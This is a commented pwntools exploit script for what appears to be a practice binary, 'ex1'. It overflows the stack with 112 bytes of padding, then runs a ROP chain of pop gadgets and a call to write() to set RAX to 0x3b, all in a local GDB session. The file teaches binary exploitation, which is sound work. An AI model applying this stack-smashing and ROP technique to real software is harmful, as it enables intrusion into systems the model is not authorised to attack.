################################################################################
# ex1-exploit.py
#   Binary: ex1
#   Source: ex1.c
#   Goal:   Set 0x3b into register RAX
################################################################################
from pwn import *

# Binary protections:
# checksec --file ex1
#    Arch:     amd64-64-little
#    RELRO:    Full RELRO               We cannot overwrite .got
#    Stack:    No canary found          We can smash the stack as we please
#    NX:       NX enabled               We need ROP (stack is non-executable)
#    PIE:      No PIE (0x400000)        We don't need a memory leak
vuln    =   "./ex1"
binary  =   ELF(vuln)

# We control EIP after padding + RBP:
padding =   b'A'*112
# A fake RBP value:
RBP     =   0xdeadbeefcafebabe

# Using ropper, we find the following ROP-gadgets we will need:
#0x0000000000401199: pop rdi; ret;
#0x000000000040119b: pop rsi; ret;
#0x000000000040119d: pop rdx; ret;
#0x0000000000401016: ret;
pop_rdi =   0x0401199
pop_rsi =   0x040119b
pop_rdx =   0x040119d
ret     =   0x0401016

# We start a local process of the vulnerable program within a GDB
# session. The program will breakpoint at 0x401016 (ret) only when
# RAX == 0x3b, after our ROP-chain attack (see later on):
r    =   gdb.debug(binary.path,'''
        b * 0x401016 if $rax == 0x3b
        c
        i r rax
        ''')

# We want to set RAX to 0x3b; we do not have any ROP-gadget to
# achieve that. Notice that we can set RAX to 0 by returning to
# 0x0040116c:
#   0x000000000040116c: mov eax, 0; leave; ret;
#
# Can we re-purpose any called function from libc6?:
# [0x403fd8] write@GLIBC_2.2.5  →  0x7ffff7e9b130
# [0x403fe0] memset@GLIBC_2.2.5  →  0x7ffff7ef5fc0
# [0x403fe8] gets@GLIBC_2.2.5  →  0x7ffff7e19fa0
#
# Yes; write() would do the trick.
# This binary is not PIE; so we can use its addresses right away
# (we don't need a leak):
rop     =   b''
rop     +=  p64(pop_rdi)
rop     +=  p64(0x1)                        # rdi <- 1, stdout
rop     +=  p64(pop_rsi)
rop     +=  p64(binary.symbols["mydata"])   # rsi <- &mydata
rop     +=  p64(pop_rdx)
rop     +=  p64(0x3b)                       # rdx <- 0x3b
rop     +=  p64(binary.symbols["plt.write"])# write(1,&data,0x3b)
rop     +=  p64(ret);                       # To use a breakpoint

# At this point, RAX == 0x3b and we will have 0x3b bytes printed on our
# screen. We can simply discard these bytes.
# You can attach a debugger now to see the value set into RAX
# right after calling write() and just before ending with return;:
# gef➤  b * 0x401016
# Breakpoint 1 at 0x401016
# gef➤  c
# Continuing.
# ...
# ●→   0x401016 <_init+22>       ret
# gef➤  i r rax
# rax            0x3b                0x3b
# This exploit automates this by using gdb.debug() (see above)
r.send(padding + p64(RBP) + rop + b'\x0a')
r.clean()
r.close()
